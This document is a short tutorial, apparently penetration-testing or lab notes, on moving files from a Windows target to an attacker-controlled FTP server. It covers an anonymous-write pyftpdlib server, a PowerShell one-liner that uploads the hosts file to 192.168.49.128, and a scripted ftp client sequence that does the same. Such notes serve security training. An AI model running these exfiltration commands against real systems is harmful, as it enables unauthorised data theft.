
## **1. Start an FTP Server (Attacker Machine)**

Use Python’s `pyftpdlib` with **upload support**:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**Note:**  
If you see:

```
write permissions assigned to anonymous user
```

That just means anonymous uploads are allowed.

---

## **2. Upload a File with PowerShell (Target Machine)**

Run this command on the target:

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

This uploads the `hosts` file from the target to the attacker’s FTP server as `ftp-hosts`.

---

## **3. Upload Using Windows FTP Client (Target Machine)**

If PowerShell isn’t available, create a scriptable command file for FTP:

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

Then execute it:

```cmd
ftp -v -n -s:ftpcommand.txt
```

This will send the file automatically without interactive prompts.

---

## **4. Tips**

- Always use **binary mode** to avoid file corruption.
    
- Make sure **port 21** is open and reachable.
    
- Enable authentication for better security if needed.
    
- For sensitive files, use **FTPS** or **SFTP** instead for encryption.
    

---